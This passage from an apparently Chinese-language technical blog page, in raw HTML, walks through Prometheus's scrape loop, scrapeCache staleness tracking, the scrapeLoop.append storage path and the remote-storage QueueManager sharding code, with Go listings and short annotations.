added, appErr := sl.<span class="built_in">append</span>(b, start)</span><br><span class="line"><span class="keyword">if</span> appErr != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Warn(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"append failed"</span>, <span class="string">"err"</span>, appErr)</span><br><span class="line"><span class="comment">// The append failed, probably due to a parse error or sample limit.</span></span><br><span class="line"><span class="comment">// Call sl.append again with an empty scrape to trigger stale markers.</span></span><br><span class="line"><span class="keyword">if</span> _, _, err := sl.<span class="built_in">append</span>([]<span class="keyword">byte</span>&#123;&#125;, start); err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Warn(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"append failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对象复用</span></span><br><span class="line">sl.buffers.Put(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> scrapeErr == <span class="literal">nil</span> &#123;</span><br><span class="line">scrapeErr = appErr</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//统计采集到的指标</span></span><br><span class="line">sl.report(start, time.Since(start), total, added, scrapeErr)</span><br><span class="line">last = start</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-sl.ctx.Done():</span><br><span class="line"><span class="built_in">close</span>(sl.stopped)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> &lt;-sl.scrapeCtx.Done():</span><br><span class="line"><span class="keyword">break</span> mainLoop</span><br><span class="line"><span class="keyword">case</span> &lt;-ticker.C:</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(sl.stopped)</span><br><span class="line"></span><br><span class="line">sl.endOfRunStaleness(last, ticker, interval)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>run方法中调用sl.scraper.scrape进行指标采集，并将采集到的指标通过sl.append方法进行存储。</p><p>再scrape过程中为了提供性能，使用sync.Pool机制来复用对象，再每次scrape后都会向pool申请和scrape结果相同大小的byte slice，并添加到sl.buffers中，以便供下一次获取指标使用</p><p>流程：</p><p><img src="/images/1572416216523.png" alt="1572416216523"></p><h2 id="LocalStorage-RemoteStorage"><a href="#LocalStorage-RemoteStorage" class="headerlink" title="LocalStorage/RemoteStorage"></a>LocalStorage/RemoteStorage</h2><p>Prometheus再通过scrape获取指标后，调用scrapeLoop.append方法将指标存储到fanoutStorage组件中，但再scrape与fanoutStorage之间加了一层scrapeCache，用于指标合法行校验。</p><p>scrapeCache缓存了两种不合法的指标：</p><p>1）指标纬度为空，无效指标</p><p>2）连续两次指标存储中，第一次存储的不带时间戳指标再第二次存储的不带时间戳指标中不存在，这部分指标过期指标</p><p>scrapeCache:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scrapeCache tracks mappings of exposed metric strings to label sets and</span></span><br><span class="line"><span class="comment">// storage references. Additionally, it tracks staleness of series between</span></span><br><span class="line"><span class="comment">// scrapes.</span></span><br><span class="line"><span class="keyword">type</span> scrapeCache <span class="keyword">struct</span> &#123;</span><br><span class="line">iter <span class="keyword">uint64</span> <span class="comment">// Current scrape iteration.</span></span><br><span class="line"><span class="comment">// 被缓存的批次数</span></span><br><span class="line"><span class="comment">// Parsed string to an entry with information about the actual label set</span></span><br><span class="line"><span class="comment">// and its storage reference.</span></span><br><span class="line">entries <span class="keyword">map</span>[<span class="keyword">string</span>]*cacheEntry</span><br><span class="line"><span class="comment">// 缓存本次采集的指标</span></span><br><span class="line"><span class="comment">// Cache of dropped metric strings and their iteration. The iteration must</span></span><br><span class="line"><span class="comment">// be a pointer so we can update it without setting a new entry with an unsafe</span></span><br><span class="line"><span class="comment">// string in addDropped().</span></span><br><span class="line">dropped <span class="keyword">map</span>[<span class="keyword">string</span>]*<span class="keyword">uint64</span></span><br><span class="line">    <span class="comment">//缓存本次采集的指标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// seriesCur and seriesPrev store the labels of series that were seen</span></span><br><span class="line"><span class="comment">// in the current and previous scrape.</span></span><br><span class="line"><span class="comment">// We hold two maps and swap them out to save allocations.</span></span><br><span class="line">seriesCur  <span class="keyword">map</span>[<span class="keyword">uint64</span>]labels.Labels</span><br><span class="line">seriesPrev <span class="keyword">map</span>[<span class="keyword">uint64</span>]labels.Labels</span><br><span class="line">    <span class="comment">//缓存上次采集的指标</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newScrapeCache</span><span class="params">()</span> *<span class="title">scrapeCache</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;scrapeCache&#123;</span><br><span class="line">entries:    <span class="keyword">map</span>[<span class="keyword">string</span>]*cacheEntry&#123;&#125;,</span><br><span class="line">dropped:    <span class="keyword">map</span>[<span class="keyword">string</span>]*<span class="keyword">uint64</span>&#123;&#125;,</span><br><span class="line">seriesCur:  <span class="keyword">map</span>[<span class="keyword">uint64</span>]labels.Labels&#123;&#125;,</span><br><span class="line">seriesPrev: <span class="keyword">map</span>[<span class="keyword">uint64</span>]labels.Labels&#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>scrapeCache主要方法：</p><p>iterDone()；用于scrapeCache缓存整理</p><p>get:根据指标信息met获取cacheEntry结构</p><p>addRef：根据指标信息增加cacheEntry节点</p><p>addDropped:添加无效指标信息到dropped</p><p>getDropped: 判断met是否为无效指标</p><p>trackStaleness:添加不带时间戳的指标到seriesCur列表</p><p>forEachStale：查找过期的指标</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sl *scrapeLoop)</span> <span class="title">append</span><span class="params">(b []<span class="keyword">byte</span>, ts time.Time)</span> <span class="params">(total, added <span class="keyword">int</span>, err error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">app            = sl.appender()</span><br><span class="line">p              = textparse.New(b)</span><br><span class="line">defTime        = timestamp.FromTime(ts)</span><br><span class="line">numOutOfOrder  = <span class="number">0</span></span><br><span class="line">numDuplicates  = <span class="number">0</span></span><br><span class="line">numOutOfBounds = <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> sampleLimitErr error</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line"><span class="keyword">for</span> p.Next() &#123;</span><br><span class="line">total++</span><br><span class="line"></span><br><span class="line">t := defTime</span><br><span class="line">met, tp, v := p.At()</span><br><span class="line"><span class="keyword">if</span> tp != <span class="literal">nil</span> &#123;</span><br><span class="line">t = *tp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sl.cache.getDropped(yoloString(met)) &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">ce, ok := sl.cache.get(yoloString(met))</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line"><span class="keyword">switch</span> err = app.AddFast(ce.lset, ce.ref, t, v); err &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="literal">nil</span>:</span><br><span class="line"><span class="keyword">if</span> tp == <span class="literal">nil</span> &#123;</span><br><span class="line">sl.cache.trackStaleness(ce.hash, ce.lset)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> storage.ErrNotFound:</span><br><span class="line">ok = <span class="literal">false</span></span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfOrderSample:</span><br><span class="line">numOutOfOrder++</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Out of order sample"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met))</span><br><span class="line">targetScrapeSampleOutOfOrder.Inc()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">case</span> storage.ErrDuplicateSampleForTimestamp:</span><br><span class="line">numDuplicates++</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Duplicate sample for timestamp"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met))</span><br><span class="line">targetScrapeSampleDuplicate.Inc()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfBounds:</span><br><span class="line">numOutOfBounds++</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Out of bounds metric"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met))</span><br><span class="line">targetScrapeSampleOutOfBounds.Inc()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">case</span> errSampleLimit:</span><br><span class="line"><span class="comment">// Keep on parsing output if we hit the limit, so we report the correct</span></span><br><span class="line"><span class="comment">// total number of samples scraped.</span></span><br><span class="line">sampleLimitErr = err</span><br><span class="line">added++</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span> loop</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">var</span> lset labels.Labels</span><br><span class="line"></span><br><span class="line">mets := p.Metric(&amp;lset)</span><br><span class="line">hash := lset.Hash()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hash label set as it is seen local to the target. Then add target labels</span></span><br><span class="line"><span class="comment">// and relabeling and store the final label set.</span></span><br><span class="line">lset = sl.sampleMutator(lset)</span><br><span class="line"></span><br><span class="line"><span class="comment">// The label set may be set to nil to indicate dropping.</span></span><br><span class="line"><span class="keyword">if</span> lset == <span class="literal">nil</span> &#123;</span><br><span class="line">sl.cache.addDropped(mets)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ref <span class="keyword">uint64</span></span><br><span class="line">ref, err = app.Add(lset, t, v)</span><br><span class="line"><span class="comment">// TODO(fabxc): also add a dropped-cache?</span></span><br><span class="line"><span class="keyword">switch</span> err &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="literal">nil</span>:</span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfOrderSample:</span><br><span class="line">err = <span class="literal">nil</span></span><br><span class="line">numOutOfOrder++</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Out of order sample"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met))</span><br><span class="line">targetScrapeSampleOutOfOrder.Inc()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">case</span> storage.ErrDuplicateSampleForTimestamp:</span><br><span class="line">err = <span class="literal">nil</span></span><br><span class="line">numDuplicates++</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Duplicate sample for timestamp"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met))</span><br><span class="line">targetScrapeSampleDuplicate.Inc()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfBounds:</span><br><span class="line">err = <span class="literal">nil</span></span><br><span class="line">numOutOfBounds++</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Out of bounds metric"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met))</span><br><span class="line">targetScrapeSampleOutOfBounds.Inc()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">case</span> errSampleLimit:</span><br><span class="line">sampleLimitErr = err</span><br><span class="line">added++</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"unexpected error"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met), <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">break</span> loop</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> tp == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Bypass staleness logic if there is an explicit timestamp.</span></span><br><span class="line">sl.cache.trackStaleness(hash, lset)</span><br><span class="line">&#125;</span><br><span class="line">sl.cache.addRef(mets, ref, lset, hash)</span><br><span class="line">&#125;</span><br><span class="line">added++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">err = p.Err()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> sampleLimitErr != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// We only want to increment this once per scrape, so this is Inc'd outside the loop.</span></span><br><span class="line">targetScrapeSampleLimit.Inc()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> numOutOfOrder &gt; <span class="number">0</span> &#123;</span><br><span class="line">level.Warn(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Error on ingesting out-of-order samples"</span>, <span class="string">"num_dropped"</span>, numOutOfOrder)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> numDuplicates &gt; <span class="number">0</span> &#123;</span><br><span class="line">level.Warn(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Error on ingesting samples with different value but same timestamp"</span>, <span class="string">"num_dropped"</span>, numDuplicates)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> numOutOfBounds &gt; <span class="number">0</span> &#123;</span><br><span class="line">level.Warn(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Error on ingesting samples that are too old or are too far into the future"</span>, <span class="string">"num_dropped"</span>, numOutOfBounds)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">sl.cache.forEachStale(<span class="function"><span class="keyword">func</span><span class="params">(lset labels.Labels)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="comment">// Series no longer exposed, mark it stale.</span></span><br><span class="line">_, err = app.Add(lset, defTime, math.Float64frombits(value.StaleNaN))</span><br><span class="line"><span class="keyword">switch</span> err &#123;</span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfOrderSample, storage.ErrDuplicateSampleForTimestamp:</span><br><span class="line"><span class="comment">// Do not count these in logging, as this is expected if a target</span></span><br><span class="line"><span class="comment">// goes away and comes back again with a new scrape loop.</span></span><br><span class="line">err = <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err == <span class="literal">nil</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">app.Rollback()</span><br><span class="line"><span class="keyword">return</span> total, added, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := app.Commit(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> total, added, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sl.cache.iterDone()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> total, added, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存储指标append方法的具体实现，</p><p>存储指标的流程：</p><p><img src="/images/1572417134533.png" alt="1572417134533"></p><p>prometheus支持远程存储，也支持本地存储。</p><p>remote中为远程存储，</p><p>tsdb中为本地存储</p><p>远程存储：存储的数据，发送过来的样本先放入到队列中，这个队列的最大分片是1000，每个分片没秒1000个sample，那么一秒就可以发送1000*1000个sample。</p><p>数据结构为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// QueueManager manages a queue of samples to be sent to the Storage</span></span><br><span class="line"><span class="comment">// indicated by the provided StorageClient.</span></span><br><span class="line"><span class="keyword">type</span> QueueManager <span class="keyword">struct</span> &#123;</span><br><span class="line">logger log.Logger</span><br><span class="line"></span><br><span class="line">cfg            config.QueueConfig                     <span class="comment">//队列配置</span></span><br><span class="line">externalLabels model.LabelSet                         <span class="comment">//</span></span><br><span class="line">relabelConfigs []*config.RelabelConfig </span><br><span class="line">client         StorageClient                          <span class="comment">// 存储客户端</span></span><br><span class="line">queueName      <span class="keyword">string</span>                                 <span class="comment">//队列名称</span></span><br><span class="line">logLimiter     *rate.Limiter                          <span class="comment">//限流</span></span><br><span class="line"> </span><br><span class="line">shardsMtx   sync.Mutex</span><br><span class="line">shards      *shards                                   <span class="comment">//分片</span></span><br><span class="line">numShards   <span class="keyword">int</span>                                       <span class="comment">//分片数目</span></span><br><span class="line">reshardChan <span class="keyword">chan</span> <span class="keyword">int</span></span><br><span class="line">quit        <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">wg          sync.WaitGroup</span><br><span class="line"></span><br><span class="line">samplesIn, samplesOut, samplesOutDuration *ewmaRate</span><br><span class="line">integralAccumulator                       <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构建好发送队列的函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewQueueManager builds a new QueueManager.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewQueueManager</span><span class="params">(logger log.Logger, cfg config.QueueConfig, externalLabels model.LabelSet, relabelConfigs []*config.RelabelConfig, client StorageClient)</span> *<span class="title">QueueManager</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> logger == <span class="literal">nil</span> &#123;</span><br><span class="line">logger = log.NewNopLogger()</span><br><span class="line">&#125;</span><br><span class="line">t := &amp;QueueManager&#123;</span><br><span class="line">logger:         logger,</span><br><span class="line">cfg:            cfg,</span><br><span class="line">externalLabels: externalLabels,</span><br><span class="line">relabelConfigs: relabelConfigs,</span><br><span class="line">client:         client,</span><br><span class="line">queueName:      client.Name(),</span><br><span class="line"></span><br><span class="line">logLimiter:  rate.NewLimiter(logRateLimit, logBurst),</span><br><span class="line">numShards:   <span class="number">1</span>,</span><br><span class="line">reshardChan: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>),</span><br><span class="line">quit:        <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line"></span><br><span class="line">samplesIn:          newEWMARate(ewmaWeight, shardUpdateDuration),</span><br><span class="line">samplesOut:         newEWMARate(ewmaWeight, shardUpdateDuration),</span><br><span class="line">samplesOutDuration: newEWMARate(ewmaWeight, shardUpdateDuration),</span><br><span class="line">&#125;</span><br><span class="line">t.shards = t.newShards(t.numShards)</span><br><span class="line">numShards.WithLabelValues(t.queueName).Set(<span class="keyword">float64</span>(t.numShards))</span><br><span class="line">queueCapacity.WithLabelValues(t.queueName).Set(<span class="keyword">float64</span>(t.cfg.Capacity))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialise counter labels to zero.</span></span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">sentBatchDuration.WithLabelValues(t.queueName)                  </span><br><span class="line">succeededSamplesTotal.WithLabelValues(t.queueName)</span><br><span class="line">failedSamplesTotal.WithLabelValues(t.queueName)</span><br><span class="line">droppedSamplesTotal.WithLabelValues(t.queueName)</span><br><span class="line"><span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用append方法来添加样本数据到队列分片中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Append queues a sample to be sent to the remote storage. It drops the</span></span><br><span class="line"><span class="comment">// sample on the floor if the queue is full.</span></span><br><span class="line"><span class="comment">// Always returns nil.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *QueueManager)</span> <span class="title">Append</span><span class="params">(s *model.Sample)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> snew model.Sample</span><br><span class="line">snew = *s</span><br><span class="line">snew.Metric = s.Metric.Clone()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ln, lv := <span class="keyword">range</span> t.externalLabels &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := s.Metric[ln]; !ok &#123;</span><br><span class="line">snew.Metric[ln] = lv</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">snew.Metric = model.Metric(</span><br><span class="line">relabel.Process(model.LabelSet(snew.Metric), t.relabelConfigs...))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> snew.Metric == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">t.shardsMtx.Lock()</span><br><span class="line">enqueued := t.shards.enqueue(&amp;snew)</span><br><span class="line">t.shardsMtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> enqueued &#123;</span><br><span class="line">queueLength.WithLabelValues(t.queueName).Inc()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">droppedSamplesTotal.WithLabelValues(t.queueName).Inc()</span><br><span class="line"><span class="keyword">if</span> t.logLimiter.Allow() &#123;</span><br><span class="line">level.Warn(t.logger).Log(<span class="string">"msg"</span>, <span class="string">"Remote storage queue full, discarding sample. Multiple subsequent messages of this kind may be suppressed."</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中使用的函数enqueue发送到队列里面：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *shards)</span> <span class="title">enqueue</span><span class="params">(sample *model.Sample)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">s.qm.samplesIn.incr(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fp := sample.Metric.FastFingerprint()</span><br><span class="line">shard := <span class="keyword">uint64</span>(fp) % <span class="keyword">uint64</span>(<span class="built_in">len</span>(s.queues))</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> s.queues[shard] &lt;- sample:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个队列存储里面用余数去分组的。</p><p>使用start方法来启动队列发送任务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *shards)</span> <span class="title">start</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(s.queues); i++ &#123;</span><br><span class="line"><span class="keyword">go</span> s.runShard(i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数runShared生成多个协程去执行：</p><figure class="highlight go"><table><tr><td 